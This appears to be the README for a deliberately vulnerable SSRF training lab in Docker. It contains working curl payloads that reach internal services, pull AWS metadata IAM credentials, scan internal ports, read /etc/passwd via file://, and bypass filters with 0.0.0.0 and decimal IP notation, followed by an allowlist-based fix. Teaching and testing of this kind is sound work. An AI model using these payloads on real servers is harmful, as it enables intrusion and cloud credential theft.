# Lab 08 — SSRF (Server-Side Request Forgery) 🔴

**Port:** `8008`  
**Stack:** Node.js + PostgreSQL  
**Internal service on:** `internal-service:8080` (Docker internal only)  
**Difficulty:** Intermediate

---

## 🕳️ Security Loopholes

1. **No URL Allowlist** — Server fetches any URL without restriction
2. **Internal Network Access** — Can reach services only accessible inside Docker network
3. **Cloud Metadata Access** — Can reach `169.254.169.254` (AWS/GCP/Azure metadata endpoint)
4. **No Scheme Restriction** — Supports `file://`, `dict://`, `gopher://` in some Node versions

---

## 🎯 Attack Scenarios

### Scenario A — Access Internal Service
```bash
docker compose up -d

# Normal webhook test (works fine)
curl -X POST http://localhost:8008/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://httpbin.org/get"}'

# SSRF: Access internal service unreachable from outside
curl -X POST http://localhost:8008/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-service:8080"}'

# Returns: {"secret":"INTERNAL_SECRET_KEY=abc123",...}
```

### Scenario B — Cloud Metadata Exfiltration (AWS Simulation)
```bash
# On real AWS — attacker uses SSRF to get IAM credentials
curl -X POST http://localhost:8008/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

curl -X POST http://localhost:8008/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

### Scenario C — Internal Port Scan via SSRF
```bash
# Scan internal network for open ports
for port in 80 443 3306 5432 6379 8080 8443 9200; do
  echo -n "Port $port: "
  curl -s -X POST http://localhost:8008/webhook/test \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://internal-service:$port\"}" \
    --max-time 2 | head -c 100
  echo
done
```

### Scenario D — Preview Endpoint Abuse
```bash
# Exfiltrate /etc/passwd via file:// (if supported)
curl "http://localhost:8008/preview?url=file:///etc/passwd"

# Access other containers in docker network
curl "http://localhost:8008/preview?url=http://db:5432"
```

### Scenario E — Bypass with DNS Rebinding / URL Tricks
```bash
# Use 0.0.0.0 as loopback alias
curl -X POST http://localhost:8008/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0:3000/"}'

# Use decimal IP notation
curl -X POST http://localhost:8008/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433/"}'  # 127.0.0.1 in decimal
```

---

## 🛠️ Tools

| Tool | Use |
|------|-----|
| `curl` | Manual SSRF payload injection |
| `Burp Collaborator` | Out-of-band SSRF detection |
| `SSRFmap` | `python3 ssrfmap.py -r req.txt -p url` |
| `nuclei` | `nuclei -t ssrf/` |

---

## 🔐 How to Fix

```javascript
const { URL } = require('url');
const dns = require('dns').promises;

const ALLOWED_HOSTS = ['payment.example.com', 'hooks.slack.com'];

async function safeRequest(urlStr) {
  const url = new URL(urlStr);

  // 1. Whitelist scheme
  if (!['https:'].includes(url.protocol)) throw new Error('Only HTTPS allowed');

  // 2. Allowlist hosts
  if (!ALLOWED_HOSTS.includes(url.hostname)) throw new Error('Host not allowed');

  // 3. Resolve DNS and block private IP ranges
  const addrs = await dns.lookup(url.hostname, { all: true });
  for (const { address } of addrs) {
    if (isPrivateIP(address)) throw new Error('Private IP not allowed');
  }

  return fetch(urlStr);
}

function isPrivateIP(ip) {
  return /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.|::1|fc|fd)/.test(ip);
}
```
